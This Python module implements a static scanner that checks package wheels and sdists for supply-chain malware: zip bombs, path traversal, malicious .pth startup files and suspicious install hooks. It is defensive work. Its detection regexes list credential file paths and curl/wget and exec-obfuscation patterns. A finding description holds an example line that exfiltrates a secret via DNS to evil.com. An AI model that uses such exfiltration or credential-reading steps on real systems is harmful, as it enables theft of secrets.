"""
Static analyzer — deep, no sandbox required.

Design principles:
  1. Zero false negatives on known attack patterns (LiteLLM 1.82.7)
  2. Minimize false positives — understand *intent*, not just presence of patterns
  3. Defense against malicious wheels (zip bombs, path traversal)
  4. Layered: structural checks → .pth semantic analysis → AST deep scan
"""
from __future__ import annotations

import ast
import hashlib
import json
import re
import zipfile
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from chaincanary.models import Finding, Severity
from chaincanary.analyzer.rules import STATIC_RULES
from chaincanary.analyzer.pth_analyzer import analyze_pth_content, PthClass, pth_severity_from_analysis


# ── Safety limits (prevents zip-bomb / resource exhaustion attacks) ────────
MAX_FILES_IN_WHEEL = 50_000
MAX_SINGLE_FILE_BYTES = 50 * 1024 * 1024   # 50 MB
MAX_TOTAL_UNCOMPRESSED = 500 * 1024 * 1024  # 500 MB


# ── Pattern libraries ──────────────────────────────────────────────────────

# Network patterns in install hooks (setup.py, etc.)
_NETWORK_PATTERNS = [
    r"\burllib\.request\b",
    r"\burllib2\.",
    r"\brequests\s*\.\s*(get|post|put|delete|head|request|Session)",
    r"\bhttpx\s*\.\s*(get|post|Client)",
    r"\baiohttp\s*\.",
    r"\bhttp\.client\b",
    r"\bsocket\.connect\b",
    r"\bsocket\.getaddrinfo\b",   # DNS exfil: encode data in hostname
    r"\bsocket\.gethostbyname\b", # DNS exfil variant
    r"\burlopen\s*\(",
    r"\burlretrieve\s*\(",
]

# Subprocess in install hooks
_SUBPROCESS_PATTERNS = [
    r"\bsubprocess\s*\.\s*(run|call|Popen|check_output|check_call)\b",
    r"\bos\.system\s*\(",
    r"\bos\.popen\s*\(",
    r"\bPopen\s*\(",
]

# Obfuscation (applies everywhere)
_OBFUSCATION_PATTERNS = [
    r"base64\.b64decode\s*\(.*?\)\s*[,)]\s*[\n\s]*exec",
    r"exec\s*\(\s*base64",
    r"eval\s*\(\s*base64",
    r"__import__\s*\(\s*['\"]base64['\"].*exec",
    r"zlib\.decompress\s*\(.*exec",
    r"marshal\.loads\s*\(",
    r"exec\s*\(\s*compile\s*\(",
]

# Sensitive paths accessed during install
_SENSITIVE_PATHS = [
    r"~[/\\]\.ssh[/\\]",
    r"~[/\\]\.aws[/\\]",
    r"~[/\\]\.netrc\b",
    r"/etc/passwd\b",
    r"/etc/shadow\b",
    r"\.ssh[/\\]id_rsa\b",
    r"\.aws[/\\]credentials\b",
    r"~[/\\]\.config[/\\]gcloud",
]

_CURL_WGET = [r"\bcurl\s", r"\bwget\s"]

# DNS exfiltration patterns — encodes data into DNS lookups
_DNS_EXFIL_PATTERNS = [
    r"socket\.getaddrinfo\s*\(",
    r"socket\.gethostbyname\s*\(",
    r"dns\.resolver\.",          # dnspython
    r"resolve\s*\(.*\..*\.",     # generic DNS resolve with dynamic hostname
]

# sys.modules indirect access (bypasses import name detection)
_SYS_MODULES_PATTERNS = [
    r"sys\.modules\s*\[",
    r"sys\.modules\.get\s*\(",
]

# Network calls in ANY Python file (not just setup.py)
_NETWORK_ANY_FILE = [
    r"\burlopen\s*\(",
    r"\brequests\.get\s*\(",
    r"\brequests\.post\s*\(",
    r"\bhttpx\.get\s*\(",
    r"\bsocket\.getaddrinfo\s*\(",    # DNS exfil
    r"\bsocket\.gethostbyname\s*\(",  # DNS exfil
]


def _load_malicious_hashes() -> set[str]:
    db_path = Path(__file__).parent.parent / "db" / "known_malicious.json"
    if not db_path.exists():
        return set()
    with open(db_path) as f:
        data = json.load(f)
    return set(h for h in data.get("sha256", []) if not h.startswith("PLACEHOLDER"))


_MALICIOUS_HASHES: set[str] = _load_malicious_hashes()


def _sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    h.update(path.read_bytes())
    return h.hexdigest()


def _matches_any(text: str, patterns: list[str]) -> list[str]:
    return [p for p in patterns if re.search(p, text, re.IGNORECASE | re.DOTALL)]


# ── Zip safety ─────────────────────────────────────────────────────────────

class WheelSecurityError(Exception):
    """Raised when a wheel file looks like a security trap."""


def _safe_read_zip(zf: zipfile.ZipFile, name: str) -> Optional[bytes]:
    """
    Read a file from a zip, enforcing size limits.
    Returns None if the file exceeds limits.
    """
    info = zf.getinfo(name)
    if info.file_size > MAX_SINGLE_FILE_BYTES:
        return None  # Skip oversized files
    return zf.read(name)


def _validate_wheel_safety(zf: zipfile.ZipFile) -> Optional[Finding]:
    """
    Check for zip-bomb and path traversal attacks.
    Returns a Finding if the wheel looks malicious, else None.
    """
    names = zf.namelist()

    # Too many files
    if len(names) > MAX_FILES_IN_WHEEL:
        return Finding(
            rule_id="WHEEL_ZIP_BOMB",
            severity=Severity.HIGH,
            title=f"Wheel contains {len(names):,} files — possible zip bomb",
            description="Legitimate packages rarely exceed a few hundred files.",
            evidence=f"File count: {len(names):,} (limit: {MAX_FILES_IN_WHEEL:,})",
            source="static",
        )

    # Path traversal
    for name in names:
        if ".." in name or name.startswith("/"):
            return Finding(
                rule_id="WHEEL_PATH_TRAVERSAL",
                severity=Severity.CRITICAL,
                title="Wheel contains path traversal entry",
                description="A file path in the wheel tries to escape the install directory.",
                evidence=f"Malicious path: {name}",
                source="static",
            )

    # Total uncompressed size
    total = sum(info.file_size for info in zf.infolist())
    if total > MAX_TOTAL_UNCOMPRESSED:
        return Finding(
            rule_id="WHEEL_OVERSIZED",
            severity=Severity.MEDIUM,
            title=f"Wheel unpacks to {total // (1024*1024):,} MB",
            description="Unusually large packages can indicate zip bombs.",
            evidence=f"Total uncompressed: {total // (1024*1024):,} MB",
            source="static",
        )

    return None


# ── AST deep visitor ────────────────────────────────────────────────────────

@dataclass
class ASTFindings:
    exec_calls: list[str]
    eval_calls: list[str]
    network_calls: list[str]
    subprocess_calls: list[str]
    obfuscation: list[str]
    sensitive_paths: list[str]


class _DeepVisitor(ast.NodeVisitor):
    """
    Walk AST and collect suspicious patterns with source locations.
    More precise than regex — understands code structure.
    """

    def __init__(self):
        self.exec_calls: list[str] = []
        self.eval_calls: list[str] = []
        self.network_calls: list[str] = []
        self.subprocess_calls: list[str] = []
        self.obfuscation: list[str] = []
        self.sensitive_paths: list[str] = []
        self._imports: set[str] = set()

    def visit_Import(self, node: ast.Import):
        for alias in node.names:
            self._imports.add(alias.name.split(".")[0])
        self.generic_visit(node)

    def visit_ImportFrom(self, node: ast.ImportFrom):
        if node.module:
            self._imports.add(node.module.split(".")[0])
        self.generic_visit(node)

    def visit_Call(self, node: ast.Call):
        name = self._call_name(node)
        loc = f"line {node.lineno}"

        if name == "exec":
            # Check if argument contains base64 decode — obfuscation
            if node.args and self._contains_b64(node.args[0]):
                self.obfuscation.append(f"exec(base64.decode(...)) at {loc}")
            else:
                self.exec_calls.append(f"exec() at {loc}")

        elif name == "eval":
            if node.args and self._contains_b64(node.args[0]):
                self.obfuscation.append(f"eval(base64.decode(...)) at {loc}")
            else:
                self.eval_calls.append(f"eval() at {loc}")

        elif name in ("urlopen", "urlretrieve"):
            self.network_calls.append(f"{name}() at {loc}")

        elif any(name.startswith(p) for p in (
            "requests.", "httpx.", "aiohttp.", "urllib.request.",
        )):
            self.network_calls.append(f"{name}() at {loc}")

        elif name in ("system", "popen", "Popen"):
            self.subprocess_calls.append(f"{name}() at {loc}")
        elif any(name.startswith(p) for p in ("subprocess.", "os.system", "os.popen")):
            self.subprocess_calls.append(f"{name}() at {loc}")

        self.generic_visit(node)

    def visit_Constant(self, node: ast.Constant):
        if isinstance(node.value, str):
            for p in _SENSITIVE_PATHS:
                if re.search(p, node.value, re.IGNORECASE):
                    self.sensitive_paths.append(node.value[:80])
        self.generic_visit(node)

    def _contains_b64(self, node: ast.expr) -> bool:
        """Check if an AST node represents a base64 decode call."""
        return (
            isinstance(node, ast.Call)
            and isinstance(node.func, ast.Attribute)
            and node.func.attr == "b64decode"
        )

    def _call_name(self, node: ast.Call) -> str:
        if isinstance(node.func, ast.Name):
            return node.func.id
        if isinstance(node.func, ast.Attribute):
            return f"{self._node_name(node.func.value)}.{node.func.attr}"
        return ""

    def _node_name(self, node: ast.expr) -> str:
        if isinstance(node, ast.Name):
            return node.id
        if isinstance(node, ast.Attribute):
            return f"{self._node_name(node.value)}.{node.attr}"
        return "?"

    def to_findings(self) -> ASTFindings:
        return ASTFindings(
            exec_calls=self.exec_calls,
            eval_calls=self.eval_calls,
            network_calls=self.network_calls,
            subprocess_calls=self.subprocess_calls,
            obfuscation=self.obfuscation,
            sensitive_paths=self.sensitive_paths,
        )


# ── Main Analyzer ──────────────────────────────────────────────────────────

class StaticAnalyzer:
    """
    Deep static analysis — no Docker required.

    Analysis layers:
      1. Wheel integrity (zip safety)
      2. Known malicious hash
      3. File structure (.pth, sitecustomize)  ← semantic .pth analysis
      4. Install hook analysis (setup.py)
      5. Deep scan of all Python files (delayed-trigger detection)
    """

    def analyze_wheel(self, wheel_path: Path, package_name: str = "") -> list[Finding]:
        findings: list[Finding] = []

        # Infer package name from wheel filename if not provided
        if not package_name:
            package_name = wheel_path.stem.split("-")[0].lower()

        # ── 1. Known malicious hash ────────────────────────────────
        file_hash = _sha256_file(wheel_path)
        if file_hash in _MALICIOUS_HASHES:
            rule = STATIC_RULES["KNOWN_MALICIOUS_HASH"]
            findings.append(Finding(
                rule_id=rule.rule_id,
                severity=rule.severity,
                title=rule.title,
                description=rule.description,
                evidence=f"SHA256: {file_hash}",
                source="static",
            ))

        # ── 2. Open and validate zip ───────────────────────────────
        try:
            with zipfile.ZipFile(wheel_path, "r") as zf:
                safety_finding = _validate_wheel_safety(zf)
                if safety_finding:
                    findings.append(safety_finding)
                    if safety_finding.rule_id == "WHEEL_ZIP_BOMB":
                        return findings  # Don't process further

                names = zf.namelist()
                findings.extend(self._check_structure(zf, names, package_name))
                findings.extend(self._check_python_files(zf, names, package_name))

        except zipfile.BadZipFile:
            findings.extend(self._analyze_sdist(wheel_path, package_name))

        return findings

    def get_wheel_filelist(self, wheel_path: Path) -> list[str]:
        try:
            with zipfile.ZipFile(wheel_path, "r") as zf:
                return zf.namelist()
        except Exception:
            return []

    # ── Structure checks ─────────────────────────────────────────────────

    def _check_structure(
        self,
        zf: zipfile.ZipFile,
        names: list[str],
        package_name: str,
    ) -> list[Finding]:
        findings = []

        # .pth files — semantic analysis
        for pth_name in (n for n in names if n.endswith(".pth")):
            raw = _safe_read_zip(zf, pth_name)
            if raw is None:
                findings.append(Finding(
                    rule_id="PTH_OVERSIZED",
                    severity=Severity.HIGH,
                    title=f".pth file exceeds size limit: {pth_name}",
                    description="A .pth file larger than 50MB is extremely suspicious.",
                    source="static",
                ))
                continue

            content = raw.decode("utf-8", errors="replace")
            analysis = analyze_pth_content(content, package_name)
            severity_str, explanation = pth_severity_from_analysis(analysis)

            if severity_str == "SAFE":
                # Empty or pure-path .pth → completely normal, skip
                continue

            elif severity_str == "LOW":
                # Runs code but no external data flow (e.g., setuptools shim)
                findings.append(Finding(
                    rule_id="PTH_CODE_EXECUTION",
                    severity=Severity.LOW,
                    title=f".pth file runs code on Python startup: {pth_name}",
                    description=(
                        "This .pth file executes Python code on every interpreter startup. "
                        "No external data flow detected — likely legitimate (e.g., coverage, setuptools). "
                        "Verify the code is expected for this package."
                    ),
                    evidence=(
                        f"File: {pth_name}\n"
                        f"Safe signals: {analysis.safe_signals}\n"
                        f"Content: {content[:200]}"
                    ),
                    source="static",
                ))

            else:
                # DANGEROUS: external data flow
                rule = STATIC_RULES["PTH_FILE_INSTALL"]
                findings.append(Finding(
                    rule_id="PTH_FILE_INSTALL",
                    severity=Severity.CRITICAL,
                    title=".pth file installs dangerous code that runs on every Python startup",
                    description=(
                        "This .pth file executes code with external data flow "
                        "(network calls, subprocess, or credential access) on every "
                        "Python interpreter startup. "
                        "This is the exact mechanism used in the LiteLLM 1.82.7 attack."
                    ),
                    evidence=(
                        f"File: {pth_name}\n"
                        f"Risk: {explanation}\n"
                        f"Content: {content[:300]}"
                    ),
                    source="static",
                ))
                # Additional findings per risk signal
                findings.extend(
                    self._pth_detail_findings(pth_name, content, analysis)
                )

        # sitecustomize.py
        for sf in (n for n in names if "sitecustomize" in n.lower()):
            rule = STATIC_RULES["SITECUSTOMIZE_MODIFY"]
            findings.append(Finding(
                rule_id=rule.rule_id,
                severity=rule.severity,
                title=rule.title,
                description=rule.description,
                evidence=f"File: {sf}",
                source="static",
            ))

        return findings

    def _pth_detail_findings(
        self,
        pth_name: str,
        content: str,
        analysis,
    ) -> list[Finding]:
        """Generate specific sub-findings for dangerous .pth content."""
        findings = []

        if any("network" in sig or "call" in sig for sig in analysis.risk_signals):
            findings.append(Finding(
                rule_id="PTH_NETWORK_BEACON",
                severity=Severity.CRITICAL,
                title=".pth file makes network call on every Python startup (phone-home)",
                description=(
                    "The .pth file contains network code that phones home "
                    "on every Python interpreter start — classic beacon/exfiltration pattern."
                ),
                evidence=f"File: {pth_name}\nSignals: {analysis.risk_signals}\nContent: {content[:200]}",
                source="static",
            ))

        if any("subprocess" in sig or "shell" in sig for sig in analysis.risk_signals):
            findings.append(Finding(
                rule_id="PTH_SUBPROCESS",
                severity=Severity.CRITICAL,
                title=".pth file spawns subprocess on every Python startup",
                description=(
                    "The .pth file runs shell commands on every Python startup."
                ),
                evidence=f"File: {pth_name}\nContent: {content[:200]}",
                source="static",
            ))

        return findings

    # ── Python file analysis ──────────────────────────────────────────────

    def _check_python_files(
        self,
        zf: zipfile.ZipFile,
        names: list[str],
        package_name: str,
    ) -> list[Finding]:
        findings = []

        py_files = [n for n in names if n.endswith(".py")]

        for py_file in py_files:
            raw = _safe_read_zip(zf, py_file)
            if raw is None:
                continue
            try:
                code = raw.decode("utf-8", errors="replace")
            except Exception:
                continue

            is_hook = self._is_install_hook(py_file)
            is_init = py_file.endswith("/__init__.py") or py_file == "__init__.py"

            # ── Pattern-based checks ──────────────────────────────
            obs = _matches_any(code, _OBFUSCATION_PATTERNS)
            if obs:
                rule = STATIC_RULES["OBFUSCATED_CODE"]
                findings.append(Finding(
                    rule_id=rule.rule_id,
                    severity=rule.severity,
                    title=rule.title,
                    description=rule.description,
                    evidence=f"File: {py_file}\nPatterns matched: {obs[:3]}",
                    source="static",
                ))

            if is_hook:
                net = _matches_any(code, _NETWORK_PATTERNS)
                if net:
                    rule = STATIC_RULES["NETWORK_IN_SETUP"]
                    findings.append(Finding(
                        rule_id=rule.rule_id,
                        severity=rule.severity,
                        title=rule.title,
                        description=rule.description,
                        evidence=f"File: {py_file}\nPatterns: {net[:3]}",
                        source="static",
                    ))

                sub = _matches_any(code, _SUBPROCESS_PATTERNS)
                if sub:
                    rule = STATIC_RULES["SUBPROCESS_IN_SETUP"]
                    findings.append(Finding(
                        rule_id=rule.rule_id,
                        severity=rule.severity,
                        title=rule.title,
                        description=rule.description,
                        evidence=f"File: {py_file}\nPatterns: {sub[:3]}",
                        source="static",
                    ))

                cw = _matches_any(code, _CURL_WGET)
                if cw:
                    rule = STATIC_RULES["CURL_WGET_IN_SETUP"]
                    findings.append(Finding(
                        rule_id=rule.rule_id,
                        severity=rule.severity,
                        title=rule.title,
                        description=rule.description,
                        evidence=f"File: {py_file}\nPatterns: {cw}",
                        source="static",
                    ))

                sp = _matches_any(code, _SENSITIVE_PATHS)
                if sp:
                    rule = STATIC_RULES["SENSITIVE_PATH_WRITE"]
                    findings.append(Finding(
                        rule_id=rule.rule_id,
                        severity=rule.severity,
                        title=rule.title,
                        description=rule.description,
                        evidence=f"File: {py_file}\nPaths: {sp[:3]}",
                        source="static",
                    ))

            # ── Delayed-trigger detection: __init__.py ────────────
            # Attackers can hide payloads in __init__.py to run on import
            # (not on install). We scan for network calls in init files.
            if is_init:
                net = _matches_any(code, _NETWORK_ANY_FILE)
                if net:
                    findings.append(Finding(
                        rule_id="INIT_NETWORK_CALL",
                        severity=Severity.MEDIUM,
                        title="Network call in __init__.py (runs on every import)",
                        description=(
                            "__init__.py makes a network call that will execute "
                            "every time the package is imported. Could be telemetry, "
                            "beacon, or legitimate update check — review carefully."
                        ),
                        evidence=f"File: {py_file}\nPatterns: {net[:3]}",
                        source="static",
                    ))

                # DNS exfiltration in __init__ — especially suspicious
                dns = _matches_any(code, _DNS_EXFIL_PATTERNS)
                if dns:
                    findings.append(Finding(
                        rule_id="DNS_EXFIL",
                        severity=Severity.HIGH,
                        title="Potential DNS exfiltration — encodes data in DNS hostname lookup",
                        description=(
                            "DNS-based exfiltration encodes stolen data (env vars, secrets) "
                            "as subdomains of an attacker-controlled domain. "
                            "It bypasses many firewalls because DNS traffic is rarely blocked. "
                            "Example: socket.getaddrinfo(base64(secret)+'.evil.com', 80)"
                        ),
                        evidence=f"File: {py_file}\nPatterns: {dns[:3]}",
                        source="static",
                    ))

                # sys.modules indirect access — bypasses import name detection
                sysmod = _matches_any(code, _SYS_MODULES_PATTERNS)
                if sysmod:
                    findings.append(Finding(
                        rule_id="SYS_MODULES_ACCESS",
                        severity=Severity.MEDIUM,
                        title="Indirect module access via sys.modules (bypasses static analysis)",
                        description=(
                            "Accessing modules via sys.modules[] is a technique to bypass "
                            "import-based detection. Attackers use it to call network/exec "
                            "functions without triggering 'import requests' style detection."
                        ),
                        evidence=f"File: {py_file}\nPatterns: {sysmod[:3]}",
                        source="static",
                    ))

            # ── AST deep analysis for install hooks ───────────────
            if is_hook:
                try:
                    tree = ast.parse(code, filename=py_file)
                    visitor = _DeepVisitor()
                    visitor.visit(tree)
                    ast_f = visitor.to_findings()

                    if ast_f.exec_calls or ast_f.eval_calls:
                        rule = STATIC_RULES["EXEC_IN_SETUP"]
                        calls = ast_f.exec_calls + ast_f.eval_calls
                        findings.append(Finding(
                            rule_id=rule.rule_id,
                            severity=rule.severity,
                            title=rule.title,
                            description=rule.description,
                            evidence=f"File: {py_file}\nCalls: {calls[:5]}",
                            source="static",
                        ))

                    if ast_f.obfuscation:
                        rule = STATIC_RULES["OBFUSCATED_CODE"]
                        findings.append(Finding(
                            rule_id=rule.rule_id,
                            severity=rule.severity,
                            title=rule.title,
                            description=rule.description,
                            evidence=f"File: {py_file}\nObfuscation: {ast_f.obfuscation[:3]}",
                            source="static",
                        ))

                except SyntaxError:
                    pass

        return findings

    @staticmethod
    def _is_install_hook(filename: str) -> bool:
        """Determine if a Python file is an install hook."""
        basename = filename.split("/")[-1].lower()
        return (
            basename == "setup.py"
            or "_hook" in basename
            or "install" in basename
            or basename == "__main__.py"
        )

    # ── SDist fallback ────────────────────────────────────────────────────

    def _analyze_sdist(self, path: Path, package_name: str) -> list[Finding]:
        findings = []
        try:
            import tarfile
            with tarfile.open(path, "r:gz") as tf:
                for member in tf.getmembers():
                    if not member.name.endswith(".py"):
                        continue
                    if member.size > MAX_SINGLE_FILE_BYTES:
                        continue
                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    code = f.read().decode("utf-8", errors="replace")

                    if self._is_install_hook(member.name):
                        net = _matches_any(code, _NETWORK_PATTERNS)
                        if net:
                            rule = STATIC_RULES["NETWORK_IN_SETUP"]
                            findings.append(Finding(
                                rule_id=rule.rule_id,
                                severity=rule.severity,
                                title=rule.title,
                                description=rule.description,
                                evidence=f"File: {member.name}",
                                source="static",
                            ))

                    obs = _matches_any(code, _OBFUSCATION_PATTERNS)
                    if obs:
                        rule = STATIC_RULES["OBFUSCATED_CODE"]
                        findings.append(Finding(
                            rule_id=rule.rule_id,
                            severity=rule.severity,
                            title=rule.title,
                            description=rule.description,
                            evidence=f"File: {member.name}",
                            source="static",
                        ))

        except Exception:
            pass
        return findings
